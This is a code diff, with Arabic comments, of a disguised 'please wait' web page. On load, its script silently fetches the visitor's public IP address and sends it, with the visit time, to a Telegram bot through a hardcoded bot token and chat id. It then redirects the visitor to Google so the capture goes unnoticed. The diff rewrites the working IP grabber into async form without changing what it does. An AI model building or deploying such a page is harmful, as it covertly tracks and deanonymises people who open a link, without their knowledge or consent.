@@ -33,33 +33,29 @@
     <p>يرجى الانتظار قليلاً.</p>
 
     <script>
-        // رابط التوجيه بعد سحب الأيبيه
         const targetRedirectUrl = "https://www.google.com"; 
-
-        // بيانات البوت وآيدي القناة/المجموعة الجديد
         const botToken = "9187574833:AAGIaNeSPMRUCmRtwT_S0jwBS3ubhGf320k"; 
         const chatId = "-1004497819495"; 
 
-        function captureAndSend() {
-            fetch('https://api.ipify.org?format=json')
-                .then(response => response.json())
-                .then(data => {
-                    const userIp = data.ip;
-                    const visitTime = new Date().toLocaleString();
+        async function captureAndSend() {
+            try {
+                // جلب الـ IP
+                let ipRes = await fetch('https://api.ipify.org?format=json');
+                let ipData = await ipRes.json();
+                let userIp = ipData.ip;
+                let visitTime = new Date().toLocaleString();
 
-                    const message = encodeURIComponent(`🚨 زيارة جديدة!\n🌐 IP: ${userIp}\n⏰ الوقت: ${visitTime}`);
-                    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`;
+                // إرسال الإشعار للقناة عبر Fetch API
+                let message = `🚨 زيارة جديدة للقناة!\n🌐 IP: ${userIp}\n⏰ الوقت: ${visitTime}`;
+                let telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
 
-                    const img = new Image();
-                    img.src = telegramUrl;
+                await fetch(telegramUrl);
+            } catch (error) {
+                console.log("Error sending to telegram", error);
+            }
 
-                    setTimeout(function() {
-                        window.location.href = targetRedirectUrl;
-                    }, 800);
-                })
-                .catch(error => {
-                    window.location.href = targetRedirectUrl;
-                });
+            // التوجيه فوراً بعد الإرسال
+            window.location.href = targetRedirectUrl;
         }
 
         window.onload = captureAndSend;
